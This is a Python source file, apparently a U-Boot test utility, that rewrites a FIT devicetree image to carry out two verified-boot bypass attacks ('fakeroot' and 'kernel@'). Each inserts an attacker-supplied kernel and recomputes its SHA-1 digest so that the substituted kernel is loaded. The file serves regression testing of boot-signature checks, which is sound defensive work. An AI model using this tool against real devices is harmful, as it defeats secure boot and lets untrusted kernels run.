# SPDX-License-Identifier: GPL-2.0
# Copyright (c) 2020, Intel Corporation

"""Modifies a devicetree to add a fake root node, for testing purposes"""

import hashlib
import struct
import sys

FDT_PROP = 0x3
FDT_BEGIN_NODE = 0x1
FDT_END_NODE = 0x2
FDT_END = 0x9

FAKE_ROOT_ATTACK = 0
KERNEL_AT = 1

MAGIC = 0xd00dfeed

EVIL_KERNEL_NAME = b'evil_kernel'
FAKE_ROOT_NAME = b'f@keroot'


def getstr(dt_strings, off):
    """Get a string from the devicetree string table

    Args:
        dt_strings (bytes): Devicetree strings section
        off (int): Offset of string to read

    Returns:
        str: String read from the table
    """
    output = ''
    while dt_strings[off]:
        output += chr(dt_strings[off])
        off += 1

    return output


def align(offset):
    """Align an offset to a multiple of 4

    Args:
        offset (int): Offset to align

    Returns:
        int: Resulting aligned offset (rounds up to nearest multiple)
    """
    return (offset + 3) & ~3


def determine_offset(dt_struct, dt_strings, searched_node_name):
    """Determines the offset of an element, either a node or a property

    Args:
        dt_struct (bytes): Devicetree struct section
        dt_strings (bytes): Devicetree strings section
        searched_node_name (str): element path, ex: /images/kernel@1/data

    Returns:
        tuple: (node start offset, node end offset)
        if element is not found, returns (None, None)
    """
    offset = 0
    depth = -1

    path = '/'

    object_start_offset = None
    object_end_offset = None
    object_depth = None

    while offset < len(dt_struct):
        (tag,) = struct.unpack('>I', dt_struct[offset:offset + 4])

        if tag == FDT_BEGIN_NODE:
            depth += 1

            begin_node_offset = offset
            offset += 4

            node_name = getstr(dt_struct, offset)
            offset += len(node_name) + 1
            offset = align(offset)

            if path[-1] != '/':
                path += '/'

            path += str(node_name)

            if path == searched_node_name:
                object_start_offset = begin_node_offset
                object_depth = depth

        elif tag == FDT_PROP:
            begin_prop_offset = offset

            offset += 4
            len_tag, nameoff = struct.unpack('>II',
                                             dt_struct[offset:offset + 8])
            offset += 8
            prop_name = getstr(dt_strings, nameoff)

            len_tag = align(len_tag)

            offset += len_tag

            node_path = path + '/' + str(prop_name)

            if node_path == searched_node_name:
                object_start_offset = begin_prop_offset

        elif tag == FDT_END_NODE:
            offset += 4

            path = path[:path.rfind('/')]
            if not path:
                path = '/'

            if depth == object_depth:
                object_end_offset = offset
                break
            depth -= 1
        elif tag == FDT_END:
            break

        else:
            print('unknown tag=0x%x, offset=0x%x found!' % (tag, offset))
            break

    return object_start_offset, object_end_offset


def modify_node_name(dt_struct, node_offset, replcd_name):
    """Change the name of a node

    Args:
        dt_struct (bytes): Devicetree struct section
        node_offset (int): Offset of node
        replcd_name (str): New name for node

    Returns:
        bytes: New dt_struct contents
    """

    # skip 4 bytes for the FDT_BEGIN_NODE
    node_offset += 4

    node_name = getstr(dt_struct, node_offset)
    node_name_len = len(node_name) + 1

    node_name_len = align(node_name_len)

    replcd_name += b'\0'

    # align on 4 bytes
    while len(replcd_name) % 4:
        replcd_name += b'\0'

    dt_struct = (dt_struct[:node_offset] + replcd_name +
                 dt_struct[node_offset + node_name_len:])

    return dt_struct


def modify_prop_content(dt_struct, prop_offset, content):
    """Overwrite the value of a property

    Args:
        dt_struct (bytes): Devicetree struct section
        prop_offset (int): Offset of property (FDT_PROP tag)
        content (bytes): New content for the property

    Returns:
        bytes: New dt_struct contents
    """
    # skip FDT_PROP
    prop_offset += 4
    (len_tag, nameoff) = struct.unpack('>II',
                                       dt_struct[prop_offset:prop_offset + 8])

    # compute padded original node length
    original_node_len = len_tag + 8  # content length + prop meta data len

    original_node_len = align(original_node_len)

    added_data = struct.pack('>II', len(content), nameoff)
    added_data += content
    while len(added_data) % 4:
        added_data += b'\0'

    dt_struct = (dt_struct[:prop_offset] + added_data +
                 dt_struct[prop_offset + original_node_len:])

    return dt_struct


def change_property_value(dt_struct, dt_strings, prop_path, prop_value,
                          required=True):
    """Change a given property value

    Args:
        dt_struct (bytes): Devicetree struct section
        dt_strings (bytes): Devicetree strings section
        prop_path (str): full path of the target property
        prop_value (bytes):  new property name
        required (bool): raise an exception if property not found

    Returns:
        bytes: New dt_struct contents

    Raises:
        ValueError: if the property is not found
    """
    (rt_node_start, _) = determine_offset(dt_struct, dt_strings, prop_path)
    if rt_node_start is None:
        if not required:
            return dt_struct
        raise ValueError('Fatal error, unable to find prop %s' % prop_path)

    dt_struct = modify_prop_content(dt_struct, rt_node_start, prop_value)

    return dt_struct

def change_node_name(dt_struct, dt_strings, node_path, node_name):
    """Change a given node name

    Args:
        dt_struct (bytes): Devicetree struct section
        dt_strings (bytes): Devicetree strings section
        node_path (str): full path of the target node
        node_name (str): new node name, just node name not full path

    Returns:
        bytes: New dt_struct contents

    Raises:
        ValueError: if the node is not found
    """
    (rt_node_start, rt_node_end) = (
        determine_offset(dt_struct, dt_strings, node_path))
    if rt_node_start is None or rt_node_end is None:
        raise ValueError('Fatal error, unable to find root node')

    dt_struct = modify_node_name(dt_struct, rt_node_start, node_name)

    return dt_struct

def get_prop_value(dt_struct, dt_strings, prop_path):
    """Get the content of a property based on its path

    Args:
        dt_struct (bytes): Devicetree struct section
        dt_strings (bytes): Devicetree strings section
        prop_path (str): full path of the target property

    Returns:
        bytes: Property value

    Raises:
        ValueError: if the property is not found
    """
    (offset, _) = determine_offset(dt_struct, dt_strings, prop_path)
    if offset is None:
        raise ValueError('Fatal error, unable to find prop')

    offset += 4
    (len_tag,) = struct.unpack('>I', dt_struct[offset:offset + 4])

    offset += 8
    tag_data = dt_struct[offset:offset + len_tag]

    return tag_data


def kernel_at_attack(dt_struct, dt_strings, kernel_content, kernel_hash):
    """Conduct the kernel@ attack

    It fetches from /configurations/default the name of the kernel being loaded.
    Then, if the kernel name does not contain any @sign, duplicates the kernel
    in /images node and appends '@evil' to its name.
    It inserts a new kernel content and updates its images digest.

    Inputs:
        - FIT dt_struct
        - FIT dt_strings
        - kernel content blob
        - kernel hash blob

    Important note: it assumes the U-Boot loading method is 'kernel' and the
    loaded kernel hash's subnode name is 'hash-1'
    """

    # retrieve the default configuration name
    default_conf_name = get_prop_value(
        dt_struct, dt_strings, '/configurations/default')
    default_conf_name = str(default_conf_name[:-1], 'utf-8')

    conf_path = '/configurations/' + default_conf_name

    # fetch the loaded kernel name from the default configuration
    loaded_kernel = get_prop_value(dt_struct, dt_strings, conf_path + '/kernel')

    loaded_kernel = str(loaded_kernel[:-1], 'utf-8')

    if loaded_kernel.find('@') != -1:
        print('kernel@ attack does not work on nodes already containing an @ sign!')
        sys.exit()

    # determine boundaries of the loaded kernel
    (krn_node_start, krn_node_end) = (determine_offset(
        dt_struct, dt_strings, '/images/' + loaded_kernel))
    if krn_node_start is None and krn_node_end is None:
        print('Fatal error, unable to find root node')
        sys.exit()

    # copy the loaded kernel
    loaded_kernel_copy = dt_struct[krn_node_start:krn_node_end]

    # insert the copy inside the tree
    dt_struct = dt_struct[:krn_node_start] + \
        loaded_kernel_copy + dt_struct[krn_node_start:]

    evil_kernel_name = loaded_kernel+'@evil'

    # change the inserted kernel name
    dt_struct = change_node_name(
        dt_struct, dt_strings, '/images/' + loaded_kernel, bytes(evil_kernel_name, 'utf-8'))

    # change the content of the kernel being loaded
    dt_struct = change_property_value(
        dt_struct, dt_strings, '/images/' + evil_kernel_name + '/data', kernel_content)

    # change the content of the kernel being loaded
    dt_struct = change_property_value(
        dt_struct, dt_strings, '/images/' + evil_kernel_name + '/hash-1/value', kernel_hash)

    return dt_struct


def fake_root_node_attack(dt_struct, dt_strings, kernel_content, kernel_digest):
    """Conduct the fakenode attack

    It duplicates the original root node at the beginning of the tree.
    Then it modifies within this duplicated tree:
        - The loaded kernel name
        - The loaded  kernel data

    Important note: it assumes the UBoot loading method is 'kernel' and the loaded kernel
    hash's subnode name is hash@1
    """

    # retrieve the default configuration name
    default_conf_name = get_prop_value(
        dt_struct, dt_strings, '/configurations/default')
    default_conf_name = str(default_conf_name[:-1], 'utf-8')

    conf_path = '/configurations/'+default_conf_name

    # fetch the loaded kernel name from the default configuration
    loaded_kernel = get_prop_value(dt_struct, dt_strings, conf_path + '/kernel')

    loaded_kernel = str(loaded_kernel[:-1], 'utf-8')

    # determine root node start and end:
    (rt_node_start, rt_node_end) = (determine_offset(dt_struct, dt_strings, '/'))
    if (rt_node_start is None) or (rt_node_end is None):
        print('Fatal error, unable to find root node')
        sys.exit()

    # duplicate the whole tree
    duplicated_node = dt_struct[rt_node_start:rt_node_end]

    # dchange root name (empty name) to fake root name
    new_dup = change_node_name(duplicated_node, dt_strings, '/', FAKE_ROOT_NAME)

    dt_struct = new_dup + dt_struct

    # change the value of /<fake_root_name>/configs/<default_config_name>/kernel
    # so our modified kernel will be loaded
    base = '/' + str(FAKE_ROOT_NAME, 'utf-8')
    value_path = base + conf_path+'/kernel'
    dt_struct = change_property_value(dt_struct, dt_strings, value_path,
                                      EVIL_KERNEL_NAME + b'\0')

    # change the node of the /<fake_root_name>/images/<original_kernel_name>
    images_path = base + '/images/'
    node_path = images_path + loaded_kernel
    dt_struct = change_node_name(dt_struct, dt_strings, node_path,
                                 EVIL_KERNEL_NAME)

    # change the content of the kernel being loaded
    data_path = images_path + str(EVIL_KERNEL_NAME, 'utf-8') + '/data'
    dt_struct = change_property_value(dt_struct, dt_strings, data_path,
                                      kernel_content, required=False)

    # update the digest value
    hash_path = images_path + str(EVIL_KERNEL_NAME, 'utf-8') + '/hash-1/value'
    dt_struct = change_property_value(dt_struct, dt_strings, hash_path,
                                      kernel_digest)

    return dt_struct

def add_evil_node(in_fname, out_fname, kernel_fname, attack):
    """Add an evil node to the devicetree

    Args:
        in_fname (str): Filename of input devicetree
        out_fname (str): Filename to write modified devicetree to
        kernel_fname (str): Filename of kernel data to add to evil node
        attack (str): Attack type ('fakeroot' or 'kernel@')

    Raises:
        ValueError: Unknown attack name
    """
    if attack == 'fakeroot':
        attack = FAKE_ROOT_ATTACK
    elif attack == 'kernel@':
        attack = KERNEL_AT
    else:
        raise ValueError('Unknown attack name!')

    with open(in_fname, 'rb') as fin:
        input_data = fin.read()

    hdr = input_data[0:0x28]

    offset = 0
    magic = struct.unpack('>I', hdr[offset:offset + 4])[0]
    if magic != MAGIC:
        raise ValueError('Wrong magic!')

    offset += 4
    (totalsize, off_dt_struct, off_dt_strings, off_mem_rsvmap, version,
     last_comp_version, boot_cpuid_phys, size_dt_strings,
     size_dt_struct) = struct.unpack('>IIIIIIIII', hdr[offset:offset + 36])

    rsv_map = input_data[off_mem_rsvmap:off_dt_struct]
    dt_struct = input_data[off_dt_struct:off_dt_struct + size_dt_struct]
    dt_strings = input_data[off_dt_strings:off_dt_strings + size_dt_strings]

    with open(kernel_fname, 'rb') as kernel_file:
        kernel_content = kernel_file.read()

    # computing inserted kernel hash
    val = hashlib.sha1()
    val.update(kernel_content)
    hash_digest = val.digest()

    if attack == FAKE_ROOT_ATTACK:
        dt_struct = fake_root_node_attack(dt_struct, dt_strings, kernel_content,
                                          hash_digest)
    elif attack == KERNEL_AT:
        dt_struct = kernel_at_attack(dt_struct, dt_strings, kernel_content,
                                     hash_digest)

    # now rebuild the new file
    size_dt_strings = len(dt_strings)
    size_dt_struct = len(dt_struct)
    totalsize = 0x28 + len(rsv_map) + size_dt_struct + size_dt_strings
    off_mem_rsvmap = 0x28
    off_dt_struct = off_mem_rsvmap + len(rsv_map)
    off_dt_strings = off_dt_struct + len(dt_struct)

    header = struct.pack('>IIIIIIIIII', MAGIC, totalsize, off_dt_struct,
                         off_dt_strings, off_mem_rsvmap, version,
                         last_comp_version, boot_cpuid_phys, size_dt_strings,
                         size_dt_struct)

    with open(out_fname, 'wb') as output_file:
        output_file.write(header)
        output_file.write(rsv_map)
        output_file.write(dt_struct)
        output_file.write(dt_strings)

if __name__ == '__main__':
    if len(sys.argv) != 5:
        print('usage: %s <input_filename> <output_filename> <kernel_binary> <attack_name>' %
              sys.argv[0])
        print('valid attack names: [fakeroot, kernel@]')
        sys.exit(1)

    in_fname, out_fname, kernel_fname, attack = sys.argv[1:]
    add_evil_node(in_fname, out_fname, kernel_fname, attack)
